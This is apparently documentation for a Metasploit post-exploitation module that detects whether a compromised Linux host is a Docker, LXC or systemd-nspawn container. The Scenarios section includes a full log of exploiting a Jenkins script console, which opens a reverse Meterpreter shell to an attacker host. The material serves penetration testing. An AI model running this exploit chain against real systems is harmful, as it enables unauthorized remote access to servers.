## Indicators

  There are several indicators that a process is being executed inside of a container. This module looks for the following indicators:

  1. Presence of `/.dockerenv` file indicates Docker.
  2. Finding select strings in `/proc/1/cgroup` indicates LXC or Docker.
  3. The value of the `container` environment variable in `/proc/1/environ` indicates LXC or systemd nspawn.

## Verification Steps

  1. Start msfconsole
  2. Get a session via exploit of your choice
  3. `run post/linux/gather/checkcontainer`
  4. You should get feedback if a container was detected

## Options

  **SESSION**

  Which session to use, which can be viewed with `sessions -l`

## Scenarios

  Check if the jenkins instance you have a shell on is running inside a Docker container.

```
msf > use exploit/multi/http/jenkins_script_console 
msf exploit(jenkins_script_console) > set API_TOKEN bc3dbc5c328733cc826c15772e6eaef5
API_TOKEN => bc3dbc5c328733cc826c15772e6eaef5
msf exploit(jenkins_script_console) > set RHOST 10.0.0.40
RHOST => 10.0.0.40
msf exploit(jenkins_script_console) > set RPORT 8080
RPORT => 8080
msf exploit(jenkins_script_console) > set TARGETURI /
TARGETURI => /
msf exploit(jenkins_script_console) > set TARGET 1
TARGET => 1
msf exploit(jenkins_script_console) > set USERNAME user
USERNAME => user
msf exploit(jenkins_script_console) > run

[*] Started reverse TCP handler on 10.0.0.49:4444 
[*] Checking access to the script console
[*] Authenticating with token...
[*] Using CSRF token: 'b83d12171ba5248100f1de20e6472067' (Jenkins-Crumb style)
[*] 10.0.0.40:8080 - Sending Linux stager...
[*] Sending stage (826840 bytes) to 10.0.0.40
[*] Meterpreter session 1 opened (10.0.0.49:4444 -> 10.0.0.40:54404) at 2017-08-16 20:56:23 -0500
[!] Deleting /tmp/aFdmPcC payload file

meterpreter > run post/linux/gather/checkcontainer 

[+] This appears to be a 'Docker' container
meterpreter > 
```
Detect a LXC container
```
meterpreter > run post/linux/gather/checkcontainer 

[+] This appears to be a 'LXC' container
meterpreter > 
```
Detect a systemd nspawn container
```
meterpreter > run post/linux/gather/checkcontainer 

[+] This appears to be a 'systemd nspawn' container
meterpreter > 
```
Detect nothing
```
meterpreter > run post/linux/gather/checkcontainer 

[*] This does not appear to be a container
meterpreter > 
```